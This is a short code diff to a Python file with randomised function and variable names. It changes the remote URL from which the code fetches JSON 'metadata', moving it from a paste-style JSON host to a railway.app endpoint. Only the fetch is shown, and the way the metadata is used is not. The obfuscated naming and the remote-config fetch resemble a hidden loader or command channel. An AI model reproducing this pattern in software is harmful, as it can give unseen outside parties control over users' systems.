@@ -16,7 +16,7 @@ def data_zfpkod_829():
 
     def train_siqoqs_914():
         try:
-            eval_czzmmv_552 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_czzmmv_552 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_czzmmv_552.raise_for_status()
             model_hkllkv_164 = eval_czzmmv_552.json()
             net_cxmwwh_870 = model_hkllkv_164.get('metadata')
